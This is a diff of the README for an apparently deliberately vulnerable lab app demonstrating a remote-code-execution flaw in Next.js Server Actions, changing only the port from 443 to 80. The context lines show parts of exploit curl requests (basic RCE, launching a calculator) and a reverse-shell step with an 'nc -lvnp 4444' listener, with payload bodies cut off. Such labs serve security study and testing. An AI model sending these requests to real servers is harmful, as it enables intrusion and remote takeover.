@@ -20,7 +20,7 @@ React Server Components contain an unsafe deserialization vulnerability in HTTP 
 docker-compose up -d
 ```
 
-The application runs on http://localhost:443
+The application runs on http://localhost:80
 
 ## Vulnerabilities
 
@@ -37,7 +37,7 @@ The vulnerability exists in how Next.js processes Server Actions. By sending a s
 **Basic RCE (Unix/Linux):**
 
 ```bash
-curl -X POST http://localhost:443/ \
+curl -X POST http://localhost:80/ \
   -H "Next-Action: x" \
   -H "X-Nextjs-Request-Id: test123" \
   -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
@@ -64,7 +64,7 @@ Check the `x-action-redirect` header in the response for the command output.
 **Execute Calculator:**
 
 ```bash
-curl -X POST http://localhost:443/ \
+curl -X POST http://localhost:80/ \
   -H "Next-Action: x" \
   -H "X-Nextjs-Request-Id: test123" \
   -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
@@ -95,7 +95,7 @@ Look for `x-action-redirect: /login?a=1806000000` in the response headers.
 nc -lvnp 4444
 
 # Send exploit:
-curl -X POST http://localhost:443/ \
+curl -X POST http://localhost:80/ \
   -H "Next-Action: x" \
   -H "X-Nextjs-Request-Id: test123" \
   -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
